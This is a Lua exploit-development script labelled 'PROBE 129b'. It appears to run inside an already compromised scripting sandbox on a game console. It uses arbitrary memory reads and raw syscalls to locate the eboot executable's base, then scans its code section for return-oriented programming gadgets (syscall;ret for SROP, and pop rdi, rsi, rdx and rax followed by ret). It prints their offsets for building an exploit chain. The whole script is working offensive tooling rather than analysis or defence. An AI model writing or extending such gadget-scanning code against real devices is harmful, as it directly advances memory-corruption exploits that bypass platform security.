-- CRASH_CLASS: LOW
-- PROBE 129b: Fast eboot gadget scan using dword reads
--
-- 128b's byte-by-byte scan only covered 0x50000 bytes before timeout.
-- This probe uses dword reads (4x faster) and scans the full eboot
-- .text section for:
--   - syscall;ret (0x0F 0x05 0xC3) — THE critical gadget for SROP
--   - pop rdi;ret (0x5F 0xC3) — for argument setup
--   - pop rsi;ret (0x5E 0xC3)
--   - pop rdx;ret (0x5A 0xC3)
--   - pop rax;ret (0x58 0xC3)
--   - pop rcx;ret (0x59 0xC3)
--   - mov rdi,rax;call (various)

print("=== PROBE 129b: FAST EBOOT GADGET SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return to_num(v) end; return nil
end

local sc20 = make_syscall(20)
local pid = to_num(sc20())
print("[0] pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
for off = 0, 0x1FC, 4 do pcall(function() memory.write_dword(info + off, 0) end) end
pcall(function() memory.write_dword(info, 0x160) end)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108) or 0
local text_hi = rd(info + 0x10C) or 0
local text_size_lo = rd(info + 0x110) or 0
local text_size_hi = rd(info + 0x114) or 0
local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("[0] eboot=" .. hex(eboot_base))
print("[0] text_size=" .. string.format("0x%X%08X", text_size_hi, text_size_lo))

-- Results arrays
local syscall_ret_gadgets = {}
local pop_rdi_ret = {}
local pop_rsi_ret = {}
local pop_rdx_ret = {}
local pop_rax_ret = {}

-- Scan by reading dwords and checking for patterns
-- syscall;ret = 0x0F 0x05 0xC3 (3 bytes)
-- In a dword at alignment 0: bytes are [b0,b1,b2,b3] = dword in LE
-- dword & 0x00FFFFFF == 0x00C3050F → syscall;ret at byte 0
-- (dword >> 8) & 0x00FFFFFF == 0x00C3050F → syscall;ret at byte 1

local SCAN_LIMIT = 0x200000  -- 2MB
local count = 0

print("[0] scanning " .. string.format("0x%X", SCAN_LIMIT) .. " bytes...")

for off = 0, SCAN_LIMIT - 4, 4 do
    local d = rd(eboot_base + off)
    if d == nil then break end  -- hit unmapped memory

    -- Check for syscall;ret (0xC3050F) at each byte position
    -- LE dword: byte0 = d & 0xFF, byte1 = (d >> 8) & 0xFF, etc.
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256

    -- syscall;ret at position 0: b0=0x0F, b1=0x05, b2=0xC3
    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
        table.insert(syscall_ret_gadgets, off)
        if #syscall_ret_gadgets <= 5 then
            print("[!] syscall;ret at eboot+0x" .. string.format("%X", off))
        end
    end
    -- syscall;ret at position 1: b1=0x0F, b2=0x05, b3=0xC3
    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then
        table.insert(syscall_ret_gadgets, off + 1)
        if #syscall_ret_gadgets <= 5 then
            print("[!] syscall;ret at eboot+0x" .. string.format("%X", off + 1))
        end
    end
    -- syscall;ret spanning two dwords: b2=0x0F, b3=0x05, next_b0=0xC3
    if b2 == 0x0F and b3 == 0x05 then
        local next_d = rd(eboot_base + off + 4)
        if next_d then
            local next_b0 = next_d % 256
            if next_b0 == 0xC3 then
                table.insert(syscall_ret_gadgets, off + 2)
                if #syscall_ret_gadgets <= 5 then
                    print("[!] syscall;ret at eboot+0x" .. string.format("%X", off + 2))
                end
            end
        end
    end
    -- b3=0x0F check for next dword
    if b3 == 0x0F then
        local next_d = rd(eboot_base + off + 4)
        if next_d then
            local nb0 = next_d % 256
            local nb1 = math.floor(next_d / 256) % 256
            if nb0 == 0x05 and nb1 == 0xC3 then
                table.insert(syscall_ret_gadgets, off + 3)
                if #syscall_ret_gadgets <= 5 then
                    print("[!] syscall;ret at eboot+0x" .. string.format("%X", off + 3))
                end
            end
        end
    end

    -- pop reg; ret (2-byte gadgets) — only check positions 0-2 to avoid double-counting
    -- pop rdi;ret = 0x5F 0xC3
    if b0 == 0x5F and b1 == 0xC3 and #pop_rdi_ret < 3 then
        table.insert(pop_rdi_ret, off)
    end
    if b1 == 0x5F and b2 == 0xC3 and #pop_rdi_ret < 3 then
        table.insert(pop_rdi_ret, off + 1)
    end
    if b2 == 0x5F and b3 == 0xC3 and #pop_rdi_ret < 3 then
        table.insert(pop_rdi_ret, off + 2)
    end

    -- pop rsi;ret = 0x5E 0xC3
    if b0 == 0x5E and b1 == 0xC3 and #pop_rsi_ret < 3 then
        table.insert(pop_rsi_ret, off)
    end
    if b1 == 0x5E and b2 == 0xC3 and #pop_rsi_ret < 3 then
        table.insert(pop_rsi_ret, off + 1)
    end

    -- pop rdx;ret = 0x5A 0xC3
    if b0 == 0x5A and b1 == 0xC3 and #pop_rdx_ret < 3 then
        table.insert(pop_rdx_ret, off)
    end
    if b1 == 0x5A and b2 == 0xC3 and #pop_rdx_ret < 3 then
        table.insert(pop_rdx_ret, off + 1)
    end

    -- pop rax;ret = 0x58 0xC3
    if b0 == 0x58 and b1 == 0xC3 and #pop_rax_ret < 3 then
        table.insert(pop_rax_ret, off)
    end
    if b1 == 0x58 and b2 == 0xC3 and #pop_rax_ret < 3 then
        table.insert(pop_rax_ret, off + 1)
    end

    count = count + 1
    -- Progress every 0x40000 bytes
    if count % 0x10000 == 0 then
        print("[scan] " .. string.format("0x%X", off) .. " / " .. string.format("0x%X", SCAN_LIMIT))
    end
end

print("")
print("--- RESULTS ---")
print("syscall;ret gadgets: " .. #syscall_ret_gadgets)
for i, off in ipairs(syscall_ret_gadgets) do
    if i <= 10 then
        print("  eboot+0x" .. string.format("%X", off) .. " = " .. hex(eboot_base + off))
    end
end

print("pop rdi;ret: " .. #pop_rdi_ret)
for i, off in ipairs(pop_rdi_ret) do
    print("  eboot+0x" .. string.format("%X", off))
end

print("pop rsi;ret: " .. #pop_rsi_ret)
for i, off in ipairs(pop_rsi_ret) do
    print("  eboot+0x" .. string.format("%X", off))
end

print("pop rdx;ret: " .. #pop_rdx_ret)
for i, off in ipairs(pop_rdx_ret) do
    print("  eboot+0x" .. string.format("%X", off))
end

print("pop rax;ret: " .. #pop_rax_ret)
for i, off in ipairs(pop_rax_ret) do
    print("  eboot+0x" .. string.format("%X", off))
end

print("")
print("scanned " .. count .. " dwords (" .. string.format("0x%X", count * 4) .. " bytes)")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 129b COMPLETE ===")
